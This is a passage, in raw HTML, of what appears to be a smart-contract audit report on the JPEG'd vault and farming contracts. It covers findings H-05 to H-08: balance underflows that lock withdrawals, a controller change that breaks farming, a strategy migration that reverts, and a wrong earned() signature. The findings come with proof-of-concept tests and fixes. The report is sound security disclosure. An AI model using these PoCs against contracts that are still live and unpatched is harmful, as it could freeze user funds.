class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">depositAll</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// send some JPEG to strategy prior to deposit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// deposit twice, so that the second deposit will invoke _update()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpFarming</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">250</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpFarming</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">250</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 1. change farm and call withdrawJPEG()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setFarmingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawJPEG</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// deposit and withdrawal will fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpFarming</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">))).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpFarming</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">units</span><span class=\"mtk1\">(</span><span class=\"mtk7\">500</span><span class=\"mtk1\">))).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<ul>\n<li>Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing <code>vault.balanceOfJPEG()</code> to report a smaller amount than previously recorded</li>\n<li><code>jpeg</code> could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets</li>\n<li>A future implementation takes a fee on the <code>jpeg</code> to be claimed</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A simple fix would be to <code>return</code> if <code>currentBalance ≤ previousBalance</code>. A full fix would properly handle potential shortfall.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">previousBalance</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1096865375\">spaghettieth (JPEG’d) confirmed, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>The issue can be reproduced, but due to the extremely specific cases in which this happens the severity should be lowered to 2.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1099243025\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/7\">jpegd/core#7</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1109877532\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I disagree with the sponsor. This is high risk.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-setting-new-controller-can-break-yvaultlpfarming\" style=\"position:relative;\"><a href=\"#h-06-setting-new-controller-can-break-yvaultlpfarming\" aria-label=\"h 06 setting new controller can break yvaultlpfarming permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/80\">[H-06] Setting new controller can break <code>YVaultLPFarming</code></a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170\">yVaultLPFarming.sol#L170</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108\">yVault.sol#L108</a><br></p>\n<p>The accruals in <code>yVaultLPFarming</code> will fail if <a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170\"><code>currentBalance &#x3C; previousBalance</code></a> in <code>_computeUpdate</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">previousBalance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>No funds can be withdrawn anymore as the <code>withdraw</code> functions first trigger an <code>_update</code>.</p>\n<p>The <code>currentBalance &#x3C; previousBalance</code> case can, for example, be triggerd by decreasing the <code>vault.balanceOfJPEG()</code> due to calling <code>yVault.setController</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setController</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_controller</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit can reduce balanceofJpeg which breaks other masterchef contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_controller</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;INVALID_CONTROLLER&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">controller</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IController</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_controller</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit new controller could return a smaller balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Setting a new controller on a vault must be done very carefully and requires a migration.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/80#issuecomment-1109891540\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This is not a duplicate of H-05. Though both of them deal with issues related to balanceOfJPEG, they describe different causes.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/80\">spaghettieth (JPEG’d) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"h-07-controller-strategy-migration-will-fail\" style=\"position:relative;\"><a href=\"#h-07-controller-strategy-migration-will-fail\" aria-label=\"h 07 controller strategy migration will fail permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/57\">[H-07] Controller: Strategy migration will fail</a></h2>\n<p><em>Submitted by hickuphh3, also found by rayn</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L95\">Controller.sol#L95</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L266\">StrategyPUSDConvex.sol#L266</a><br></p>\n<p>The controller calls the <code>withdraw()</code> method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done.</p>\n<p>The migration would therefore revert.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Insert this test into <a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/StrategyPUSDConvex.ts\"><code>StrategyPUSDConvex.ts</code></a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;will revert when attempting to migrate strategy&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;jpeg&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace <code>_current.withdraw(address(jpeg));</code> with <code>_current.withdrawJPEG(vaults[_token])</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1096633358\">spaghettieth (JPEG’d) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The proposed migration steps would modify the intended behaviour, which is to withdraw JPEG to the controller and not the vault. A correct solution would be replacing <code>_current.withdraw(address(jpeg))</code> with <code>_current.withdrawJPEG(address(this))</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1099242526\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/6\">jpegd/core#6</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-08-strategypusdconvexbalanceofjpeg-uses-incorrect-function-signature-while-calling-extrarewardearned-causing-the-function-to-unexpectedly-revert-everytime\" style=\"position:relative;\"><a href=\"#h-08-strategypusdconvexbalanceofjpeg-uses-incorrect-function-signature-while-calling-extrarewardearned-causing-the-function-to-unexpectedly-revert-everytime\" aria-label=\"h 08 strategypusdconvexbalanceofjpeg uses incorrect function signature while calling extrarewardearned causing the function to unexpectedly revert everytime permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/139\">[H-08] <code>StrategyPUSDConvex.balanceOfJPEG</code> uses incorrect function signature while calling <code>extraReward.earned</code>, causing the function to unexpectedly revert everytime</a></h2>\n<p><em>Submitted by rayn</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234\">StrategyPUSDConvex.sol#L234</a><br></p>\n<p>As specified in Convex <a href=\"https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149\">BaseRewardPool.sol</a> and <a href=\"https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127\">VirtualRewardPool.sol</a>, the function signature of <code>earned</code> is <code>earned(address)</code>. However, <code>balanceOfJPEG</code> did not pass any arguments to <code>earned</code>, which would cause <code>balanceOfJPEG</code> to always revert.</p>\n<p>This bug will propagate through <code>Controller</code> and <code>YVault</code> until finally reaching the source of the call in <code>YVaultLPFarming ._computeUpdate</code>, and render the entire farming contract unuseable.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Both <code>BaseRewardPool.earned</code> and <code>VirtualBalanceRewardPool.earned</code> takes an address as argument</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function earned(address account) public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            balanceOf(account)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .div(1e18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .add(rewards[account]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function earned(address account) public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            balanceOf(account)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .div(1e18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                .add(rewards[account]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>But <code>balanceOfJPEG</code> does not pass any address to <code>extraReward.earned</code>, causing the entire function to revert when called</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function balanceOfJPEG() external view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 availableBalance = jpeg.balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 length = baseRewardPool.extraRewardsLength();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (address(jpeg) == extraReward.rewardToken()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                availableBalance += extraReward.earned();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                //we found jpeg, no need to continue the loop</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                break;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return availableBalance;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 